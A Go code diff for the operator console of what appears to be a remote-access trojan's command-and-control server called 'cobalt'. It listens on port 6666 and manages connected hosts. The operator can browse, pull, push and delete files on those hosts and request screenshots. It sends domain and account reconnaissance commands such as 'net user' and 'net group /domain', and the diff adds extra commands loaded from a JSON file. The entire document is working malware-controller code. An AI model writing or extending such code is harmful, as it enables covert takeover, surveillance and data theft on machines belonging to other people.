@@ -3,6 +3,8 @@ package main
 import (
 	cobalt_file "My-Comment/cobalt.file"
 	"My-Comment/cobalt.tcp"
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"log"
 	"os"
@@ -16,32 +18,38 @@ import (
 
 var Computer = runtime.GOOS
 var DEBUG = cobalt_tcp.DEBUG
+var Userpath = "UserOpersion"
 
-/*
-当前任务列表
- 搜集信息的时候可以选择全部都要，然后保存到文件中
-1. 客户机设置
-2. debug模式
-bug : 	连接无法重新建立，一旦断开，就无法重新连接
-		有些命令返回无法正常运行，会让客户端直接挂掉
-		统一编码方式
-*/
 //var ipChanMap = make(map[int]cobalt_tcp.HOSTS, cobalt_tcp.MaxConnect)
+
+type JsonMsg struct {
+	Name, Cmd string
+}
 
 //var ipChanMap map[int]*cobalt_tcp.HOSTS
 func main() {
 	//for i := 0; i < cobalt_tcp.MaxConnect; i++ {
 	//	ipChanMap[i] = new(cobalt_tcp.HOSTS)
 	//}
-	fmt.Println("正在启动\n")
+	Computer = runtime.GOOS
+	fmt.Println("正在启动")
 	listener, err := cobalt_tcp.MyListen()
 	if err != nil {
-		fmt.Println("监听失败\n")
+		fmt.Println("监听失败")
 		fmt.Println(err)
 	} else {
 		go cobalt_tcp.IpChanMap[0].Listener(listener)
 		fmt.Printf("开始监听端口6666\n")
 	}
+	if !cobalt_file.PathExists("CmdJson") {
+		err1 := os.Mkdir("CmdJson", 0644)
+		cobalt_file.PutErr(err1, "记录文件夹不存在还创建不了\n")
+	}
+	if !cobalt_file.PathExists(Userpath) {
+		err1 := os.Mkdir(Userpath, 0644)
+		cobalt_file.PutErr(err1, "记录文件夹不存在还创建不了\n")
+	}
+
 	for {
 		menu()
 	}
@@ -69,14 +77,15 @@ func menu() {
 		return
 	}
 
-	if cobalt_tcp.Computer == "Windows" {
+	if cobalt_tcp.Computer == "windows" {
 		fmt.Scanf("%s", &num)
 	}
 	for {
 		n, err := fmt.Scanf("%d", &num)
 		if n != 1 || err != nil {
-			fmt.Printf("选择功能\n")
+			fmt.Printf("选择设置\n")
 			fmt.Printf("1. 开始选择主机\n")
+			fmt.Printf("2. 服务端设置\n")
 			fmt.Printf("0. 刷新\n")
 			continue
 		}
@@ -86,12 +95,53 @@ func menu() {
 	switch num {
 	case 1:
 		SelectHost()
+	case 2:
+		ServerSet()
 	default:
 		return
 	}
 
 }
+func ServerSet() {
+	fmt.Printf("当前状态： \n")
+	if cobalt_tcp.DEBUG {
+		fmt.Printf("1.调试功能已打开\n")
+	} else {
+		fmt.Printf("1.调试功能未打卡\n")
+	}
+	if cobalt_tcp.OPENIP {
+		fmt.Printf("2.当前按照ip地址区分主机\n")
+	} else {
+		fmt.Printf("2.当前按照ip地址加端口区分主机\n")
+	}
+	var num int
+	if cobalt_tcp.Computer == "windows" {
+		fmt.Scanf("%d", &num)
+	}
+	for {
+		n, err := fmt.Scanf("%d", &num)
+		if n != 1 || err != nil {
+			fmt.Printf("选择修改的内容\n")
+			fmt.Printf("1. 修改Debug状态\n")
+			fmt.Printf("2. 修改主机识别模式\n")
+			fmt.Printf("0. 返回上一级\n")
+			continue
+		}
+		break
+	}
 
+	switch num {
+	case 0:
+		return
+	case 1:
+		cobalt_tcp.SwicheSet(1)
+	case 2:
+		cobalt_tcp.SwicheSet(2)
+	default:
+		defer ServerSet()
+		return
+	}
+}
 func SelectHost() {
 	var contralId int
 	exec.Command("clear") // 清除屏幕
@@ -102,7 +152,7 @@ func SelectHost() {
 	for i := 1; i <= len(cobalt_tcp.IpChanMap); i++ {
 		fmt.Printf("%d\t%s\n", i, cobalt_tcp.IpChanMap[i].Ip)
 	}
-	if cobalt_tcp.Computer == "Windows" {
+	if cobalt_tcp.Computer == "windows" {
 		fmt.Scanf("%s", &contralId)
 	}
 	for {
@@ -188,7 +238,8 @@ func SetHost(hosts cobalt_tcp.HOSTS, id int) {
 		defer SetHost(hosts, id)
 	case 0:
 		return
-
+	default:
+		defer SetHost(hosts, id)
 	}
 
 }
@@ -251,6 +302,8 @@ func ViewHost(hosts cobalt_tcp.HOSTS, id int) {
 		defer ViewHost(hosts, id)
 	case 0:
 		defer ViewHost(hosts, id)
+	default:
+		defer ViewHost(hosts, id)
 	}
 }
 func ViewDemain(hosts cobalt_tcp.HOSTS, id int) {
@@ -306,6 +359,8 @@ func ViewDemain(hosts cobalt_tcp.HOSTS, id int) {
 		defer ViewDemain(hosts, id)
 	case 0:
 		defer SetHost(hosts, id)
+	default:
+		defer ViewDemain(hosts, id)
 	}
 }
 
@@ -320,9 +375,8 @@ func FileDeal(id int) {
 
 	reg := regexp.MustCompile("(.*/)")
 	hosts.Chans <- "DocumentDocument\r\n"
-	if DEBUG {
-		fmt.Printf("DocumentDocument\r\n")
-	}
+
+	//cobalt_debug.Debug("DocumentDocument\r\n")
 	for _, j := range hosts.Disk[1:] {
 		fmt.Printf("存在盘符%s\n", j)
 	}
@@ -332,7 +386,7 @@ func FileDeal(id int) {
 	}
 	for {
 
-		fmt.Printf("%s>", abslsentPath)
+		fmt.Printf("\n%s>", abslsentPath)
 		_, err := fmt.Scanf("%s %s\n", &Type, &relativePath)
 		if err != nil && err.Error() != "unexpected newline" {
 			fmt.Printf("输入错误6\n")
@@ -352,7 +406,7 @@ func FileDeal(id int) {
 			}
 		case "cd":
 			if relativePath == ".." {
-				if strings.Index(abslsentPath, "\\") == -1 {
+				if strings.Index(abslsentPath, "/") == -1 {
 					if DEBUG {
 						fmt.Printf("未找到/\n")
 					}
@@ -385,12 +439,12 @@ func FileDeal(id int) {
 				fmt.Printf("path:%s\n", path)
 			}
 			hosts.Chans <- path
-			go cobalt_tcp.Times(800, id)
+			go cobalt_tcp.Times(700, id)
 			<-cobalt_tcp.IpChanMap[id].ChansTime
 		case "get":
 			hosts.Chans <- "Documentget " + abslsentPath + "/" + relativePath
 			hosts.ChansFileName <- relativePath
-			go cobalt_tcp.Times(800, id)
+			go cobalt_tcp.Times(700, id)
 			<-cobalt_tcp.IpChanMap[id].ChansTime
 		case "del":
 			hosts.Chans <- "Documentdel " + abslsentPath + "/" + relativePath
@@ -424,6 +478,14 @@ func Fileput(AimPath string, id int) {
 	var lens int64
 	var err1 error
 	var file []byte
+	//斜杠转换
+	//regstrings := "(/)"
+	regstringss := "/"
+	//reg1 := regexp.MustCompile(regstrings)
+	reg2 := regexp.MustCompile(regstringss)
+	//AimPath = reg1.ReplaceAllString(AimPath, "\\\\")
+	AimPath = reg2.ReplaceAllString(AimPath, "\\")
+
 BEGIN:
 	fmt.Println("输入要传输的本地文件：")
 	fmt.Println(" 按quit退出")
@@ -440,6 +502,8 @@ BEGIN:
 	}
 
 	file, lens, err1 = cobalt_file.OpenFIle(localPath)
+	lens1 := base64.StdEncoding.EncodedLen(int(lens)) // 将文件内容处理位base64后的大小
+	lens = int64(lens1)
 	if err1 != nil {
 		fmt.Printf("输入错误，")
 		goto BEGIN
@@ -448,10 +512,10 @@ BEGIN:
 	regstring := "(.*/)"
 	reg := regexp.MustCompile(regstring)
 	AimName := reg.ReplaceAllString(localPath, ``)
-	cobalt_tcp.IpChanMap[id].Chans <- "Documentput " + AimPath + "/" + AimName
-	cobalt_tcp.IpChanMap[id].Chans <- "Document" + strconv.FormatInt(lens, 10)
-	go cobalt_tcp.Times(100, id)
-	<-cobalt_tcp.IpChanMap[id].ChansTime
+	cobalt_tcp.IpChanMap[id].Chans <- "Documentput " + AimPath + "\\" + AimName
+	cobalt_tcp.IpChanMap[id].Chans <- "Document" + strconv.FormatInt(lens, 10) + "@"
+	//go cobalt_tcp.Times(100, id)
+	//<-cobalt_tcp.IpChanMap[id].ChansTime
 	cobalt_tcp.IpChanMap[id].Chans <- "Document" + string(file)
 
 	if DEBUG {
@@ -464,30 +528,28 @@ BEGIN:
 }
 func AllInfo(id int) {
 	dirname := cobalt_tcp.IpChanMap[id].Ip
-	err := os.Mkdir(dirname, 0755)
-	if err != nil {
-		fmt.Println("创建父文件夹失败")
-		log.Println(err)
-		return
+	if !cobalt_file.PathExists(dirname) {
+		err1 := os.Mkdir(dirname, 0644)
+		cobalt_file.PutErr(err1, "创建父文件夹失败\n")
 	}
-	err1 := os.Mkdir(dirname+"/"+"用户信息", 0755)
-	if err1 != nil {
-		fmt.Println("创建子文件夹1失败")
-		log.Println(err1)
-		return
+	if !cobalt_file.PathExists(dirname + "/" + "用户信息") {
+		err1 := os.Mkdir(dirname+"/"+"用户信息", 0644)
+		cobalt_file.PutErr(err1, "创建子文件夹1失败\n")
 	}
-	err2 := os.Mkdir(dirname+"/"+"域信息", 0755)
-	if err2 != nil {
-		fmt.Println("创建子文件夹2失败")
-		log.Println(err2)
-		return
+	if !cobalt_file.PathExists(dirname + "/" + "域信息") {
+		err1 := os.Mkdir(dirname+"/"+"域信息", 0644)
+		cobalt_file.PutErr(err1, "创建子文件夹2失败\n")
+	}
+	if !cobalt_file.PathExists(dirname + "/" + "Json") {
+		err1 := os.Mkdir(dirname+"/"+"Json", 0644)
+		cobalt_file.PutErr(err1, "创建子文件夹3失败\n")
 	}
 	allUserCmd := map[string]string{
 		//"当前进程":"wmic process list brief",
 		"所有用户":  "net user",
 		"本地管理员": "net localgroup administrators",
 		//"主机ip信息": "ipconfig /all",
-		"路由表": "route print",
+		//"路由表": "route print",
 		//"本机服务": "wmic service list brief",
 	}
 
@@ -496,11 +558,16 @@ func AllInfo(id int) {
 		"域的名字": "net config workstation",
 		//"域列表":    "net view /domain",
 		"域用户组列表": "net group /domain",
-		"存活主机":   "arp -a",
-		"所属域":    "net config Workstation",
+		//"存活主机":   "arp -a",
+		"所属域": "net config Workstation",
 	}
+	allJsonCmd := GetJson("./CmdJson/CmdJson.json")
 	langCmd := "Cmd\r\n"
-
+	for name, cmd := range allJsonCmd {
+		filename := dirname + "/Json/" + name
+		cobalt_tcp.IpChanMap[id].ChansFileName <- filename
+		langCmd = langCmd + cmd + "#"
+	}
 	for name, cmd := range allUserCmd { //用来写入用户信息
 		filename := dirname + "/用户信息/" + name
 		cobalt_tcp.IpChanMap[id].ChansFileName <- filename
@@ -513,6 +580,7 @@ func AllInfo(id int) {
 		langCmd = langCmd + cmd + "#"
 
 	}
+
 	cobalt_tcp.IpChanMap[id].Chans <- langCmd[:len(langCmd)-1]
 	//cobalt_tcp.IpChanMap[id].ChansFileName <- "###"
 	//<-cobalt_tcp.IpChanMap[id].ChansTime
@@ -528,4 +596,36 @@ func Watch(id int) {
 	cobalt_tcp.IpChanMap[id].ChansFileName <- name
 	cobalt_tcp.IpChanMap[id].Chans <- cmd
 	fmt.Printf("等待接受图片\n")
+}
+func GetJson(Path string) map[string]string {
+	var cmd = make(map[string]string)
+	file, err1 := os.Open(Path)
+	defer file.Close()
+	if err1 != nil {
+		fmt.Printf("打开json失败\n")
+		log.Println(err1)
+		return nil
+	}
+	var Jsons = make([]byte, 1024*8)
+	_, err2 := file.Read(Jsons)
+	fmt.Printf("file :%s", Jsons)
+	cobalt_file.PutErr(err2, "读取json失败\n")
+	dec := json.NewDecoder(strings.NewReader(string(Jsons)))
+	t, err := dec.Token()
+	cobalt_file.PutErr(err, "json生成失败\n")
+	t = t
+
+	for dec.More() {
+		var m JsonMsg // decode an array value (Message)
+		err3 := dec.Decode(&m)
+		cobalt_file.PutErr(err3, "json装换失败\n")
+
+		cmd[m.Name] = m.Cmd
+		//fmt.Printf("%v: %v\n", m.Name, m.Cmd)
+	}
+	t, err = dec.Token()
+	if err != nil {
+		log.Fatal(err)
+	}
+	return cmd
 }
